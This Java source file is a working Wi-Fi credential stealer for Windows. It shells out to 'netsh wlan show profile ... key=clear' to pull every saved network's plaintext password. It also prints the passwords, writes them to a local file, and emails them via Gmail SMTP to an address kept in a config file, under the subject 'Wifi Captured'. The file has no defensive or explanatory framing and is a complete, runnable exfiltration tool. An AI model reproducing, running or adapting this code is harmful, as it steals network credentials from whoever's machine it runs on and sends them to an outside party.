package com.jimboyz;

import jakarta.mail.*;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeMessage;
import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

/*
 * @author jimBoYz Ni ChOy
 * Apr. 29, 2025 Tue.
 * 07:39 PM
 */

public class Main {

    private static final Path PATH = Paths.get(System.getProperty("user.dir") + FileSystems.getDefault().getSeparator() + "wifi-password.txt");

    public static void main(String[] args) {

        try{

            // Delete file (wifi-password.txt)
            Files.deleteIfExists(PATH);

            ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe","/c","netsh wlan show profiles");
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            StringBuilder sb = new StringBuilder();

            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while((line = bufferedReader.readLine()) != null){
                if(line.contains("All User Profile")){
                    String profile = line.split(":")[1].trim();
                    String password = retrievePassword(profile);

                    if(password != null){
                        sb.append("Profile: ").append(profile)
                                .append(" | Password: ")
                                .append(password)
                                .append("\n");
                    }
                }
            }
            // Send the captured Wi-Fi password to email
            sendToMail(sb.toString());

        }catch(IOException e){
            throw new RuntimeException(e);
        }
    }

    private static String retrievePassword(String profile){
        try{
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "netsh wlan show profile \""+profile + "\" key=clear");
            builder.redirectErrorStream(true);
            Process process = builder.start();

            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while((line = bufferedReader.readLine()) != null){
                if(line.contains("Key Content")){
                    String password = line.split(":")[1].trim();
                    // Print to the console
                    System.out.println("Profile: " + profile + ", Password: " + password);
                    // Store to a file
                    storeToFile("Profile: " + profile + ", Password: " + password + "\n");

                    return password;
                }
            }

        }catch(IOException e){
            throw new RuntimeException(e);
        }

        return null;
    }

    private static void storeToFile(String content) throws IOException {

        try(OutputStream os = Files.newOutputStream(PATH, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
            PrintWriter printWriter = new PrintWriter(os)) {
            printWriter.append(content);
        } catch(IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void sendToMail(String content) throws IOException {
        Properties props = new Properties();
        props.load(new FileInputStream(".email-config"));

        final String username = props.getProperty("app.email.username");
        final String password = props.getProperty("app.email.password"); // Use app-specific password for Gmail

        // Recipient's email
        String toEmail = props.getProperty("app.email.receiver");

        // Mail server configuration
        props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.transport.protocol", "smtp");
        props.put("mail.smtp.port", "587");

        // Authenticator
        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });

        try {
            // Compose the message
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
//            Address to = new InternetAddress("example.mail.com");
//            message.setRecipient(Message.RecipientType.TO, to);
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(toEmail));
            message.setSubject("Wifi Captured - " + new SimpleDateFormat("MM-dd-yyyy | hh:mm:ss a").format(new Date()));
            message.setText(content);

            // Send the message
            Transport.send(message);
            System.out.println("Email sent successfully!");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }
}